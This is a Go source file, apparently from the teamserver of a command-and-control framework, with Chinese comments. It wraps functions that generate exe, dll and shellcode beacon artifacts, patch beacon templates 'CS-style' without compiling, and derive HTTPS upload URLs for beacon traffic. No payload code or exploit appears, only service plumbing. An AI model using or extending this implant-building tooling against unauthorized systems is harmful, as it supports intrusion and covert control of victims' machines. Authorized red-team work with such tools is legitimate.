// Artifact 生成/模板补丁/清单用例。搬运自 cli/cli_artifact.go 的 artifact 包调用段。
// 密钥模式、upload-url 推导等"载荷出厂规则"集中在服务层, 入口层只做参数解析与打印。
package service

import (
	"cleat/teamserver/internal/artifact"
)

// ArtifactGenerate 生成 exe/dll/shc artifact(构建+归档)。搬运自 cli.artifactGenerate 主体。
// 现场编译路径默认关闭(见 artifact.Generate); 启用需 -artifact-allow-compile。
func (s *Service) ArtifactGenerate(spec *ArtifactSpec) (*ArtifactResult, error) {
	_, gen := s.artifactEnv()
	return gen.Generate(spec)
}

// ArtifactUploadHint https 未显式给 upload-url 时的默认约定推导提示。
// 返回 (推导结果, 是否适用本提示)。搬运自 cli.artifactGenerate 的提示段(打印留在入口层)。
func (s *Service) ArtifactUploadHint(spec *ArtifactSpec) (string, bool) {
	if spec.UploadURL == "" && spec.Transport == string(artifact.HTTPS) {
		return artifact.DeriveUploadURL(spec.URL), true
	}
	return "", false
}

// ArtifactPatch 模板化配置写入(CS 式, 秒级出样本零编译)。
// https 且未显式 upload_url 时按 beacon 默认约定推导(poll → upload), 避免上报帧 POST 到
// Poll 路径被 server 当探活丢弃 —— 该推导原在 cli.artifactPatch 内, 属出厂规则, 随业务下沉。
func (s *Service) ArtifactPatch(tmplPath, outPath string, cfg map[string]any) error {
	if cfg["transport"] == string(artifact.HTTPS) {
		if up, _ := cfg["upload_url"].(string); up == "" {
			if url, _ := cfg["url"].(string); url != "" {
				if d := artifact.DeriveUploadURL(url); d != "" {
					cfg["upload_url"] = d
				}
			}
		}
	}
	return artifact.PatchTemplate(tmplPath, outPath, cfg)
}

// ArtifactList 已生成 artifact 清单。返回 (条目, 产物根目录)。
func (s *Service) ArtifactList() ([]string, string, error) {
	_, g := s.artifactEnv()
	items, err := g.List()
	return items, g.OutRoot, err
}
